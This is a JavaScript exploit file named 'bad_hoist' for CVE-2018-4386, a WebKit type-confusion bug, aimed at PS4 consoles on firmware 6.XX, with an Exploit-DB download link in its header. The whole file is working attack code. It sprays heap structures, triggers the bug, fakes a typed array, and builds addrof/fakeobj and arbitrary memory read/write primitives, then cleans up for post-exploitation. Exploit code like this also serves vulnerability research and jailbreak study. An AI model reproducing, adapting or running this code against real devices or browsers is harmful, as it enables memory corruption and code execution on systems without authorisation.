/*

bad_hoist
============

Exploit implementation of
[CVE-2018-4386](https://bugs.chromium.org/p/project-zero/issues/detail?id=1665).
Obtains addrof/fakeobj and arbitrary read/write primitives.

Supports PS4 consoles on 6.XX. May also work on older firmware versions,
but I am not sure. Bug was fixed in firmware 7.00.

EDB Note ~ Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47893.zip
*/


var STRUCTURE_SPRAY_SIZE = 0x1800;

var g_confuse_obj = null;
var g_arb_master = null;
var g_arb_slave = new Uint8Array(0x2000);
var g_leaker = {};
var g_leaker_addr = null;
var g_structure_spray = [];

var dub = new Int64(0x41414141, 0x41414141).asDouble();
var g_inline_obj = {
    a: dub,
    b: dub,
};

function spray_structs() {
    for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
        var a = new Uint32Array(0x1)
        a["p" + i] = 0x1337;
        g_structure_spray.push(a); // keep the Structure objects alive.
    }

}

function trigger() {

    var o = {
        'a': 1
    };

    var test = new ArrayBuffer(0x100000);
    g_confuse_obj = {};

    var cell = {
        js_cell_header: new Int64([
            0x00, 0x8, 0x00, 0x00, // m_structureID, current guess
            0x0, // m_indexingType
            0x27, // m_type, Float64Array
            0x18, // m_flags, OverridesGetOwnPropertySlot |
            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
            0x1 // m_cellState, NewWhite
        ]).asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_inline_obj,
        len_and_flags: (new Int64('0x0001000100000020')).asJSValue()
    };

    g_confuse_obj[0 + "a"] = cell;

    g_confuse_obj[1 + "a"] = {};
    g_confuse_obj[1 + "b"] = {};
    g_confuse_obj[1 + "c"] = {};
    g_confuse_obj[1 + "d"] = {};


    for (var j = 0x5; j < 0x20; j++) {
        g_confuse_obj[j + "a"] = new Uint32Array(test);
    }

    for (var k in o) {
        {
            k = {
                a: g_confuse_obj,
                b: new ArrayBuffer(test.buffer),
                c: new ArrayBuffer(test.buffer),
                d: new ArrayBuffer(test.buffer),
                e: new ArrayBuffer(test.buffer),
                1: new ArrayBuffer(test.buffer),

            };

            function k() {
                return k;
            }

        }

        o[k];

        if (g_confuse_obj["0a"] instanceof Uint32Array) {
            return;
        }
    }
}

function setup_arb_rw() {
    var jsCellHeader = new Int64([
        0x00, 0x08, 0x00, 0x00, // m_structureID, current guess
        0x0, // m_indexingType
        0x27, // m_type, Float64Array
        0x18, // m_flags, OverridesGetOwnPropertySlot |
        // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1 // m_cellState, NewWhite
    ]);
    g_fake_container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_arb_slave,
        lengthAndFlags: (new Int64('0x0001000000000020')).asJSValue()
    };

    g_inline_obj.a = g_fake_container;
    g_confuse_obj["0a"][0x4] += 0x10;
    g_arb_master = g_inline_obj.a;
    g_arb_master[0x6] = 0xFFFFFFF0;
}

function read(addr, length) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);

    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();

    var a = new Array(length);

    for (var i = 0; i < length; i++)
        a[i] = g_arb_slave[i];
    return a;
}

function read8(addr) {
    return read(addr, 1)[0];
}

function read16(addr) {
    return Struct.unpack(Struct.int16, read(addr, 2));
}

function read32(addr) {
    return Struct.unpack(Struct.int32, read(addr, 4));
}

function read64(addr) {
    return new Int64(read(addr, 8));
}

function readstr(addr) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    var a = [];
    for (var i = 0;; i++) {
        if (g_arb_slave[i] == 0) {
            break;
        }
        a[i] = g_arb_slave[i];
    }
    return String.fromCharCode.apply(null, a);
}

function write(addr, data) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    for (var i = 0; i < data.length; i++)
        g_arb_slave[i] = data[i];
}

function write8(addr, val) {
    write(addr, [val]);
}

function write16(addr, val) {
    write(addr, Struct.pack(Struct.int16, val));
}


function write32(addr, val) {
    write(addr, Struct.pack(Struct.int32, val));
}

function write64(addr, val) {
    if (!(val instanceof Int64))
        val = new Int64(val);
    write(addr, val.bytes());
}

function writestr(addr, str) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    for (var i = 0; i < str.length; i++)
        g_arb_slave[i] = str.charCodeAt(i);
    g_arb_slave[str.length] = 0; // null character
}


function setup_obj_leaks() {
    g_leaker.leak = false;
    g_inline_obj.a = g_leaker;
    g_leaker_addr = new Int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add(0x10);
    debug_log("obj_leaker address @ " + g_leaker_addr);
}

function addrof(obj) {
    g_leaker.leak = obj;
    return read64(g_leaker_addr);
}

function fakeobj(addr) {
    write64(g_leaker_addr, addr);
    return g_leaker.leak;
}

function typed_array_buf_addr(typed_array) {
    return read64(addrof(typed_array).add(0x10));
}

function cleanup() {
    var u32array = new Uint32Array(8);
    header = read(addrof(u32array), 0x10);
    write(addrof(g_arb_master), header);
    write(addrof(g_confuse_obj['0a']), header);

    // Set length to 0x10 and flags to 0x1
    // Will behave as OversizeTypedArray which can survive gc easily
    write32(addrof(g_arb_master).add(0x18), 0x10);
    write32(addrof(g_arb_master).add(0x1C), 0x1); //
    write32(addrof(g_confuse_obj['0a']).add(0x18), 0x10);
    write32(addrof(g_confuse_obj['0a']).add(0x1C), 0x1);
    write32(addrof(g_arb_slave).add(0x1C), 0x1);

    var empty = {};
    header = read(addrof(empty), 0x8);
    write(addrof(g_fake_container), header);
}

function start_exploit() {
    debug_log("Spraying Structures...");
    spray_structs();
    debug_log("Structures sprayed!");
    debug_log("Triggering bug...");
    trigger();
    debug_log("Bug successfully triggered!");
    debug_log("Crafting fake array for arbitrary read and write...");
    setup_arb_rw();
    debug_log("Array crafted!");
    debug_log("Setting up arbitrary object leaks...");
    setup_obj_leaks();
    debug_log("Arbitrary object leaks achieved!");
    debug_log("Cleaning up corrupted structures...");
    cleanup();
    debug_log("Cleanup done!");
    debug_log("Starting post exploitation...");
}

start_exploit();